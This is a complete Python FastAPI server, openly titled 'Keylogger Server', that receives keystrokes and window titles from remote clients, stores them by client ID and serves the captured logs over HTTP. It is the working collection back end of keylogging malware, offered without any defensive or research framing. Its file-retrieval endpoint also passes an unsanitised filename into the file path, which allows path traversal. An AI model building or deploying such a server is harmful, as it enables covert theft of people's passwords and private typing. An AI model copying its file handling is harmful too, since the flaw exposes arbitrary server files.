from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from datetime import datetime
import json
import os
from typing import List, Optional
import uvicorn

app = FastAPI(title="Keylogger Server", version="1.0.0")

# Data models
class KeylogData(BaseModel):
    timestamp: str
    keystroke: str
    window_title: Optional[str] = None

class KeylogBatch(BaseModel):
    client_id: str
    data: List[KeylogData]

# Create data directory if it doesn't exist
DATA_DIR = "data/keylogs"
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

@app.get("/")
async def root():
    return {"message": "Keylogger Server is running", "status": "active"}

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

@app.post("/keylog")
async def receive_keylog(keylog_batch: KeylogBatch):
    """
    Receive keylog data from client
    """
    try:
        # Create filename with client ID and timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{DATA_DIR}/keylog_{keylog_batch.client_id}_{timestamp}.json"
        
        # Prepare data for saving
        save_data = {
            "client_id": keylog_batch.client_id,
            "received_at": datetime.now().isoformat(),
            "total_keystrokes": len(keylog_batch.data),
            "data": [item.dict() for item in keylog_batch.data]
        }
        
        # Save to file
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(save_data, f, indent=2, ensure_ascii=False)
        
        return {
            "status": "success",
            "message": f"Saved {len(keylog_batch.data)} keystrokes",
            "filename": filename
        }
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error saving keylog data: {str(e)}")

@app.get("/keylogs")
async def list_keylogs():
    """
    List all saved keylog files
    """
    try:
        files = []
        for filename in os.listdir(DATA_DIR):
            if filename.startswith("keylog_") and filename.endswith(".json"):
                filepath = os.path.join(DATA_DIR, filename)
                stat = os.stat(filepath)
                files.append({
                    "filename": filename,
                    "size": stat.st_size,
                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                })
        
        return {"files": files, "total": len(files)}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error listing files: {str(e)}")

@app.get("/keylogs/{filename}")
async def get_keylog(filename: str):
    """
    Get specific keylog file content
    """
    try:
        filepath = os.path.join(DATA_DIR, filename)
        if not os.path.exists(filepath):
            raise HTTPException(status_code=404, detail="File not found")
        
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        return data
    
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="File not found")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error reading file: {str(e)}")

if __name__ == "__main__":
    print("Starting Keylogger Server...")
    print("Server will be available at: http://localhost:8000")
    print("API documentation at: http://localhost:8000/docs")
    uvicorn.run(app, host="0.0.0.0", port=8000)
